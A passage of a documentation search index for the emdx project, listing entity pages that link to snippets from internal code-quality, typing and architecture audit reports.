<code>execution: dict[str, Any]</code> fields</p> <p>```python class GroupDict(TypedDict, total=False):     id: int     name: str     group_type: str     description: str     doc_count: int     total_cost_usd: float     total_tokens: int     is_active: bool</p> </li> </ul>"},{"location":"entities/groupdict/#uitypespy-2-typeddicts","title":"<code>ui/types.py</code> \u2014 2 TypedDicts","text":"TypedDict total=False? <code>GroupDict</code> yes <code>AgentExecutionDict</code> yes"},{"location":"entities/groupdict/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/ui/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.7)</li> <li><code>cascaderundict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>ui/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>pipelineactivitydict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>pipeline_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>pipeline_display_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>initial_doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>grouplistitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>agentexecutiondict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>worst offenders by</code>dict[str, any]<code>count:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/groupspy/","title":"groups.py","text":"<p>Type: heading | Mentioned in: 18 documents | First seen: 2026-02-13</p>"},{"location":"entities/groupspy/#documents-18","title":"Documents (18)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li><code>parent: int | None = typer.Option(None, ...)</code> - Legitimate: optional parent group</li> <li> <p><code>project: str | None = typer.Option(None, ...)</code> - Legitimate: optional...</p> </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: Summary</p> <p>...pe.py | 1 | 1 | Yes (doc param) | | briefing.py | 6 | 5 | Yes (new TypedDicts) | | groups.py | 1 | 1 | Yes (DocumentGroup exists) | | browse.py | 1 | 0 | No (local dict conversion) | | core.py | 1 | 0 | No (local list comp) | | review.py | 1 | 0 | No (Any is...</p> </li> <li> <p>#6432 Any/None typing audit [1/5]   Section: Actionable Recommendations</p> <ol> <li>groups.py:create_group - Remove unused <code>**kwargs: Any</code> parameter</li> </ol> </li> <li>groups.py:list_groups - Remove unused <code>**kwargs: Any</code> parameter  </li> <li> <p>Consider creating a type alias <code>SqlParams = list[str | int | None]</code> for SQL parameter lists</p> </li> <li> <p>#6415 Type System Audit: Replace Any/None with Concrete Types [2/4]   Section: Summary</p> <p>...----| | documents.py | 12 functions | High | | cascade.py | 7 functions | High | | groups.py | 8 functions | Medium | | search.py | 1 function | Medium | | init.py (SQLiteDatabase) | 8 methods | Low (delegates) |</p> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: Review Summary</p> <p>...r None before accessing index:</p> </li> <li><code>documents.py</code>: count_documents(), get_stats()</li> <li><code>groups.py</code>: get_recursive_doc_count(), _update_group_metrics()</li> <li><code>executions.py</code>: get_execution_stats() (2 locations)</li> <li><code>tags.py</code>: get_or_create_tag(), merge_tags()</li> <li> <p>`tasks.p...</p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> <p>...<code>tasks.py</code>: <code>create_task()</code> epic_seq</p> </li> <li><code>executions.py</code>: <code>get_execution_stats()</code></li> <li> <p><code>groups.py</code>: <code>get_recursive_doc_count()</code>, <code>_update_group_metrics()</code></p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: SQL Injection Vectors (Controlled but Risky)</p> File Line Issue <code>groups.py</code> 155 Dynamic column names from dict keys <code>tasks.py</code> 174 Column names interpolated without whitelist <code>migrations.py</code> 1830, 1954 Dynamic ALTER TABLE construction </li> <li> <p>#6379 Codebase Bug Audit 2026-02-15 [10/10]   Section: CRITICAL ISSUES (3)</p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 1. SQL Query Duplication</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 1. Code Duplication</p> <p>...237, 281, 334</p> </li> <li><code>trash.py</code>: lines 56, 106, 165</li> <li><code>browse.py</code>: lines 30, 96, 145</li> <li> <p><code>groups.py</code>: lines 39, 84, 139, 189, 296, 372, 418</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 1: Architecture Issues (High Impact)</p> <p>...| | 7 commands bypass services layer | HIGH | <code>core.py</code>, <code>browse.py</code>, <code>gist.py</code>, <code>groups.py</code>, <code>tags.py</code>, <code>trash.py</code> import <code>database/</code> directly | | 2 layer violations | MEDIUM | <code>database/documents.py</code> imports from <code>models/tags</code> (upward); `utils/claude_wrap...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...ash.py`: trash, restore, purge</p> </li> <li><code>tasks.py</code>: agent work queue with dependencies</li> <li><code>groups.py</code>: hierarchical document organization</li> <li><code>prime.py</code>: session priming context</li> <li> <p><code>status.py</code>: project status overview</p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> <p>...n comments explaining the dynamic SQL pattern</p> </li> <li> <p>Documented allowlist rationale in <code>groups.py</code> <code>update_group()</code></p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: Findings</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>..._system*.py<code>tests models, not CLI) | |</code>gdoc.py<code>| \u274c NO | |</code>gist.py<code>| \u274c NO | |</code>groups.py<code>| \u2705 YES (</code>test_commands_groups.py<code>) | |</code>maintain.py<code>| \u274c NO | |</code>prime.py<code>| \u274c NO | |</code>recipe.py<code>| \u274c NO | |</code>similarity.py` | \u26a0\ufe0f PARTIAL (tests service, some CLI...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...ll necessary (7 typer options + function params)</p> </li> <li>tasks.py: All necessary</li> <li>groups.py: All necessary</li> <li>maintain.py: All necessary (return types)</li> <li>tags.py: All necessary</li> <li>stale.py: All necessary</li> <li>recipe.py: All necessary</li> <li> <p>**gist.p...</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...fields | | <code>emdx/models/executions.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/database/groups.py</code> | 1 | 1 | Simple kwargs | | <code>emdx/utils/output.py</code> | 1 | 0 | JSON serialization (keep) | | <code>emdx/utils/retry.py</code> | 8 | 0 | Generic decorator (keep) | | Total |...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...| 561 | SUPPORT - Execution history viewer. Useful but could be simpler. | | groups.py | 452 | UNDERUTILIZED - Document grouping system. Adds complexity, unclear use case. | | browse.py | 253 | REDUNDANT - TUI browser. Could be simplified...</p> </li> </ul>"},{"location":"entities/groupspy/#groupspy_1","title":"groups.py","text":""},{"location":"entities/groupspy/#3-missing-commit-after-metrics-updates-in-groupspy","title":"3. Missing Commit After Metrics Updates in <code>groups.py</code>","text":"<p>File: <code>emdx/database/groups.py:220-221</code> Severity: Critical</p>"},{"location":"entities/groupspy/#moderate-repeated-where-clauses","title":"Moderate: Repeated WHERE Clauses","text":"<p>Files: <code>documents.py</code>, <code>groups.py</code>, <code>cascade.py</code></p>"},{"location":"entities/groupspy/#3-medium-dynamic-sql-in-group-updates","title":"3. MEDIUM: Dynamic SQL in Group Updates","text":"<p>File: <code>emdx/database/groups.py:155-160</code> Severity: MEDIUM (mitigated by allowlist)</p>"},{"location":"entities/groupspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.6)</li> <li><code>review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>briefing.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.3)</li> <li><code>connection.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.2)</li> <li><code>cascade.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (11 shared docs, PMI=5.0)</li> <li><code>recipe.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.8)</li> <li><code>gist.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.8)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/healthmonitorpy/","title":"health_monitor.py","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2026-02-14</p>"},{"location":"entities/healthmonitorpy/#documents-12","title":"Documents (12)","text":"<ul> <li>#6434 Any/None typing audit [4/5]   Section: Priority Recommendations <p>...ecution_monitor.py<code>- 4 functions returning</code>dict[str, Any]` with known shapes</p> </li> <li><code>health_monitor.py</code> - 2 functions returning <code>dict[str, Any]</code> with known shapes</li> <li><code>duplicate_detector.py</code> - 3 functions with <code>dict[str, Any]</code></li> <li> <p><code>cascade_service.py</code> - `get_orphaned_ca...</p> </li> <li> <p>#6874 Delegate synthesis [synthesis]   Section: Common Themes</p> <p>...re service APIs exist with zero callers: <code>document_merger.py</code> (merge strategies), <code>health_monitor.py</code> (health reports), <code>auto_tagger.py</code> (batch tagging, custom patterns), <code>execution_monitor.py</code> (zombie cleanup). These were likely written speculatively or for planned...</p> </li> <li> <p>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/healthmonitorpy/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Functions with ZERO Callers Outside Their Own File</p> <p>...ment_merger.py<code>|</code>find_related_documents<code>| **NO** | no | *nowhere* | |</code>services/health_monitor.py<code>|</code>generate_health_report<code>| **NO** | no | *nowhere* | |</code>services/health_monitor.py<code>|</code>get_project_health<code>| **NO** | no | *nowhere* | |</code>services/health_monitor....</p> <ul> <li>#6470 Comprehensive Any/None Typing Audit Report for EMDX   Section: 2. emdx/services/ (14 files audited) <p>...argets**:</p> </li> <li><code>execution_monitor.py</code>: 4 functions returning process health data</li> <li><code>health_monitor.py</code>: 2 functions returning health metrics</li> <li><code>duplicate_detector.py</code>: 3 functions with duplicate info</li> <li> <p><code>cascade_service.py</code>: Orphaned execution data</p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: 3. Functions That Are Too Long</p> </li> <li> <p>#6315 Delegate: Analyze CODE COMMENTS &amp; DOCUMENTATION across emdx/ (exclude  [2/15]   Section: \u2705 STRENGTHS</p> <p>...licate_detector.py:224-245`: Comments explain LSH candidate generation strategy</p> </li> <li><code>health_monitor.py</code>: Comments explain threshold choices and scoring logic</li> <li> <p><code>migrations.py</code>: Each migration has docstring explaining what and why</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...g streaming via file watcher</p> </li> <li><code>auto_tagger.py</code>: automatic tag assignment</li> <li><code>health_monitor.py</code>: system health checks</li> <li> <p><code>cli_executor/</code>: pluggable CLI executor factory (Claude, Cursor)</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 6. Service Interface Analysis</p> <p>Services with cleanup potential:</p> </li> <li><code>cascade_service.py</code> - unused, logic moved to commands</li> <li><code>health_monitor.py</code> - overlaps with <code>execution_monitor.py</code></li> <li> <p><code>duplicate_detector.py</code> - replaced by <code>similarity.py</code></p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 2. HIGH: <code>commands/analyze.py</code> Contains 700+ Lines of Business Logic**</p> <p>Impact:</p> </li> <li>Cannot reuse analysis logic in other contexts</li> <li>Duplicates logic that exists in <code>services/health_monitor.py</code></li> <li> <p>Mixes presentation (Rich tables) with business logic</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...embedding_service.py: All 1 necessary</p> </li> <li>log_stream.py: All 1 necessary</li> <li>health_monitor.py: All 2 necessary</li> <li>duplicate_detector.py: All 2 necessary</li> <li>cascade_service.py: All 2 necessary</li> <li>file_watcher.py: All 1 necessary</li> <li> <p>**execution_servic...</p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: UNNECESSARY <code>| None</code> Annotations</p> </li> </ul> <pre><code>def __init__(self, db_path: Union[str, Path] | None = None):\n</code></pre> <p>Assessment: NECESSARY \u2014 same pattern.</p> <ul> <li>#6445 Test [2/2]   Section: Coverage Analysis by Area <p>...ed (0-40%) | Module | Coverage | Notes | |--------|----------|-------| | <code>services/health_monitor.py</code> | 12% | System health monitoring | | <code>utils/git_ops.py</code> | 15% | Git worktree operations | | <code>utils/environment.py</code> | 19% | Environment detection | | `ui/cascade/cas...</p> </li> </ul>"},{"location":"entities/healthmonitorpy/#health_monitorpy60-97-calculate_overall_health","title":"health_monitor.py:60-97 - <code>calculate_overall_health()</code>","text":"<p>Calculates 6 metrics inline. Should iterate over a list of metric calculators.</p>"},{"location":"entities/healthmonitorpy/#5-health_monitorpy54-healthmonitor__init__","title":"5. <code>health_monitor.py:54</code> \u2014 <code>HealthMonitor.__init__</code>","text":""},{"location":"entities/healthmonitorpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.1)</li> <li><code>services/hybrid_search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>execution_monitor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.9)</li> <li><code>duplicate_detector.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.8)</li> <li><code>cli_executor/factory.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>document_merger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.6)</li> <li><code>file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>cli_executor/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>ui/themes.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/help/","title":"help=","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-22</p>"},{"location":"entities/help/#documents-9","title":"Documents (9)","text":"<ul> <li>#6839 Delegate: list   Section: 1. <code>emdx/commands/delegate.py</code> \u2014 Subcommand routing fix <p>...name, and if so, manually invokes it via click's context machinery</p> </li> <li> <p>Removed the <code>help=</code> parameter from the Typer app constructor (it conflicted with the callback's docstring)</p> </li> <li> <p>#6837 Delegate: list [1/2]   Section: Fix: Delegate subcommand routing (<code>list</code>, <code>running</code>, <code>stats</code>, etc.)</p> <p>...he subcommand instead of treating it as a task prompt. Also removed the redundant <code>help=</code> from the Typer app constructor (the function docstring serves as the help text).</p> </li> <li> <p>#6835 Delegate: list   Section: Changes on disk (uncommitted)</p> <p>...rgument and re-routes it through Click's subcommand machinery</p> </li> <li> <p>Removed redundant <code>help=</code> from the Typer app constructor (already in the callback docstring)</p> </li> <li> <p>#6836 Delegate: list   Section: Changes</p> <p>...e <code>isinstance(ctx.command, click.MultiCommand)</code> type check</p> </li> <li>Removed hardcoded <code>help=</code> from <code>typer.Typer()</code> \u2014 lets the callback's docstring serve as the help text, which properly includes both the delegate usage and the subcommands listing</li> <li> <p>**Adde...</p> </li> <li> <p>#6833 Delegate: list   Section: Summary</p> </li> <li>Removed the <code>help=</code> string from the Typer constructor (the docstring handles it)</li> <li> <p>Added subcommand detection at the top of <code>delegate()</code>: when the first positional arg matches a re...</p> </li> <li> <p>#6830 Delegate: --help [2/2]</p> <p><code>emdx/commands/delegate.py</code>:</p> </li> <li>Removed <code>help=</code> from <code>typer.Typer()</code> \u2014 the <code>delegate()</code> function's docstring now serves as the help text, giving the rich description with all examples</li> <li>Added <code>import click</code></li> <li> <p>A...</p> </li> <li> <p>#6829 Delegate: --help [2/2]   Section: Summary</p> </li> <li>Removed <code>help=</code> from <code>typer.Typer()</code>: The help text is now derived from the callback's docstring, which is richer and includes usage examples</li> <li> <p>Fixed subcommand routing: Repl...</p> </li> <li> <p>#6828 Delegate: --help [2/2]</p> <ol> <li>Removed stale <code>help=</code> from Typer constructor \u2014 The old string <code>\"Delegate tasks to agents (stdout-friendly)\"</code> was outdated. The docstring on the <code>delegate()</code> callback now serves as the...</li> </ol> </li> <li> <p>#6827 Delegate: --help [2/2]   Section: Summary</p> <ol> <li>Removed redundant <code>help=</code> from Typer constructor (line 53) \u2014 The short description \"One-shot AI execution (parallel, worktree, PR)\" is already provided by <code>LAZY_HELP</code> in <code>main.py</code>, so the <code>help=</code> parameter on the Typer app was unnecessary.</li> </ol> </li> </ul>"},{"location":"entities/help/#1-emdxcommandsdelegatepy-subcommand-routing-fix","title":"1. <code>emdx/commands/delegate.py</code> \u2014 Subcommand routing fix","text":""},{"location":"entities/help/#2-emdxcommandsdelegatepy-two-fixes","title":"2. <code>emdx/commands/delegate.py</code> \u2014 Two fixes:","text":""},{"location":"entities/help/#related-entities","title":"Related Entities","text":"<ul> <li><code>typer.typer()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>[tasks]...</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>emdx delegate stats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>click.multicommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>emdx/utils/lazy_group.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>1.</code>emdx/commands/delegate.py<code>\u2014 subcommand routing fix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>invoke_without_command=true</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.3)</li> <li><code>emdx delegate list</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.3)</li> <li><code>emdx delegate --help</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=6.2)</li> <li><code>import click</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.2)</li> </ul>"},{"location":"entities/high-impact/","title":"high impact","text":"<p>Type: proper_noun | Mentioned in: 15 documents | First seen: 2026-02-14</p>"},{"location":"entities/high-impact/#documents-15","title":"Documents (15)","text":"<ul> <li>#6696 Delegate: Research noise filtering strategies for entity-based documen [1/4] <p>This misses the structural headings problem entirely. ---</p> </li> </ul>"},{"location":"entities/high-impact/#strategy-1-heading-specific-blocklist-immediate-high-impact","title":"Strategy 1: Heading-Specific Blocklist (Immediate, High Impact)","text":"<p>Rationale: Headings are the worst noise source because markdown convention produces the same generic section names acr...</p> <ul> <li>#6583 Delegate synthesis [synthesis] <p>Zero mock specs = zero regression safety net \u2014 This is arguably more impactful than the production <code>Any</code> issues because it means refactors can't rely on the test suite to catch interface drift. ## Actionable Items (Priority Order)</p> </li> </ul>"},{"location":"entities/high-impact/#immediate","title":"Immediate ...","text":"<ul> <li>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3] <p>These match Textual's own typing patterns. ---</p> </li> </ul>"},{"location":"entities/high-impact/#fixable-any-usages-prioritized","title":"Fixable <code>Any</code> Usages \u2014 Prioritized","text":""},{"location":"entities/high-impact/#priority-1-high-impact-used-in-interfacesabcs","title":"Priority 1: High Impact (Used in Interfaces/ABCs)","text":""},{"location":"entities/high-impact/#1-activityactivity_itemspy-doc_db-any-parameter-6-occurrences","title":"1. <code>activity/activity_items.py</code> \u2014 <code>doc_db: Any</code> parameter (6 occurrences)","text":"<p>Lines: 53, 58, 89, 125, ...</p> <ul> <li>#6534 EMDX Future Directions: Agent-First Design [2/4]   Section: Priority Recommendations <p>High Impact / Lower Effort:</p> </li> <li>Real-time execution dashboard (extends existing LogBrowser patterns)</li> <li>Enhanced Activity View with cost badges and batch operations</li> <li> <p>Approval workflow for code changes (modal-based, minimal new screens)</p> </li> <li> <p>#6532 EMDX Future Directions: Agent-First Design [3/4]   Section: Prioritized Roadmap</p> </li> <li>Retry logic (<code>--retry N</code>)</li> <li>Cost budgets (<code>--budget $X</code>)</li> <li> <p>Agent memory (<code>--memory N</code>)</p> </li> <li> <p>#6493 Any Type Removal Analysis [2/5]</p> <p><code>emdx/ui/vim_editor.py</code></p> </li> </ul> Line Current Signature Recommended Type Rationale 23 <code>def __init__(self, app_instance: Any, ...)</code> <code>app_instance: VimEditorHost</code> (Protocol) Same as ... <ul> <li> <p>#6330 Delegate synthesis [synthesis]</p> <p>Execution support misplaced in utils/: <code>claude_wrapper.py</code>, <code>output_parser.py</code>, <code>structured_logger.py</code> belong in <code>services/</code></p> </li> <li> <p>Inconsistent presenter pattern: DocumentBrowser and SearchScreen have presenters; LogBrowser and CascadeBrowser d...</p> </li> <li> <p>#6328 Delegate: Analyze emdx/ui/ for architecture improvements. Focus on: (1 [3/10]</p> </li> </ul>"},{"location":"entities/high-impact/#phase-1-resilience-low-effort-high-impact","title":"Phase 1: Resilience (Low Effort, High Impact)","text":""},{"location":"entities/high-impact/#5-quick-wins-low-effort-high-impact","title":"5. Quick Wins (Low Effort, High Impact)","text":"<ol> <li>Create <code>emdx/ui/mixins/</code> directory with:</li> <li><code>cursor_navigation.py</code> - j/k/g/G bindings</li> <li><code>screen_switching.py</code> - 1/2/3/4 actions</li> <li><code>status_bar.py</code> - update_status pattern</li> </ol> <p>2.</p> <ul> <li>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 4. Boilerplate Reduction Opportunities </li> <li>Open connection</li> <li>Build query with conditions</li> <li>Execute</li> <li>Convert rows to dicts</li> <li> <p>Close connection</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)</p> </li> </ul> <p>Date: 2026-02-14 Scope: emdx/ excluding ui/ and tests/ \u2014 10 parallel delegate analyses</p>"},{"location":"entities/high-impact/#high-impact-repetitive-crud-pattern","title":"High Impact: Repetitive CRUD Pattern","text":"<p>Every model file repeats the same pattern:</p>"},{"location":"entities/high-impact/#codebase-quality-analysis-synthesized-summary","title":"Codebase Quality Analysis \u2014 Synthesized Summary","text":""},{"location":"entities/high-impact/#tier-1-architecture-issues-high-impact","title":"Tier 1: Architecture Issues (High Impact)","text":"<p>| Finding | Severity | Details | |---------|----------|--...</p> <ul> <li>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/) <p><code>merge_similar()</code> has duplicated dry-run vs actual merge logic. Recommendation: </p> </li> <li>Separate wizard UI from maintenance operations</li> <li>Extract <code>_determine_keep_document(doc1, doc2)</code> helper to deduplicate keep/remove logic</li> </ul>"},{"location":"entities/high-impact/#quick-wins-high-i","title":"Quick Wins (High I...","text":"<ul> <li>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15] </li> </ul>"},{"location":"entities/high-impact/#1-module-duplication-pattern-high-impact","title":"1. Module Duplication Pattern (High Impact)","text":""},{"location":"entities/high-impact/#split-git-functionality","title":"Split Git Functionality","text":"<p>Two modules serve similar purposes with overlapping names:</p> File Purpose Functions <code>utils/git.py</code> Basic git operations `crea... <ul> <li>#6218 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14] <p>Potential Breaking Changes in Behavior</p> </li> </ul> Risk Details <code>--supersede</code> flag Now disabled by default (was enabled before?) <code>find</code> with no args Now requires either query, tags, or date filter <code>delegate</code> numeric args ..."},{"location":"entities/high-impact/#related-entities","title":"Related Entities","text":"<ul> <li><code>qa_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>popular_tags: list[dict[str, any]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>lower impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>logbrowser</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>log_browser*.py</code> 